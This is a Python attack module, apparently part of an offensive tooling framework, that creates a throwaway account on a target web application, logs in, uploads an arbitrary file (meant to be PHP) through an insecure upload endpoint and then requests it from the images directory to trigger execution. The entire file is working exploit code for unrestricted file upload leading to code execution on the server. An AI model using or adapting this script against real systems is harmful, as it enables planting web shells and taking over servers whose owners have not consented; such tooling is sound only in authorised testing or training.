#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import re
import hashlib
import base64
from os import urandom


class AtkUploadPHP(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.utility.target = host
        self.host = host
        self.port = port
        self.debug = debug
        self.description = "The module can be upload a php file using web application's coding bug."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkUploadPHP object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__


    def sendattack(self, filepath):
        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}

        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        upload_url = "http://" + self.target + "/upload"

        #search_object1 = re.search(r"http://(.*)/" , upload_url)
        #target_host = search_object1.group(1)

        with open(filepath, "r") as f:
            upfile = f.read()

        search_object2 = re.search(r".*/(.*)$" , filepath)
        filename = search_object2.group(1)

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()
            
            set_id = hashlib.sha256(urandom(10)).hexdigest()
            set_password = urandom(10).hex()
            nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
            set_nickname = "Uiharu" + "_" + nickname_token

            json_data = { "user_name": set_id, "password": set_password, "nick_name": set_nickname}      
            headers = { "Content-Type": "application/json" }
            #target_url = "http://" + target_host + "/create"
            target_url = "http://" + self.target + "/create"
            response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            if self.debug:
                print(f"userid: {set_id}")
                print(f"password: {set_password}")
                print(f"nick_name: {set_nickname}")
                print("-----create user-----")
                print("Status code:   %i" % response1.status_code)
                print("Response body: %s" % response1.text)

            json_data = { "user_name": set_id, "password": set_password} 
            target_url = "http://" + self.target + "/login"
            response2 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            if self.debug:
                print("-----login-----")
                print("Status code:   %i" % response2.status_code)
                print("Response body: %s" % response2.text)

            json_data = { "file_name": filename, "file_data": base64.b64encode(upfile.encode()).decode()} 
            response3 = session.post(upload_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
            
            if self.debug:
                print("-----upload-----")
                print("Status code:   %i" % response3.status_code)
                print("Response body: %s" % response3.text)

            #target_url = "http://" + target_host + "/images/players/" + filename
            target_url = "http://" + self.target + "/images/players/" + filename
            response4 = session.post(target_url, headers=headers, proxies=proxies, timeout=timeoutvalue)

            if response4.status_code == 200:
                self.logger("Attack SUCCESS!", "+")   
            else:
                self.logger("May be Attack failed?", "!")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)

    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

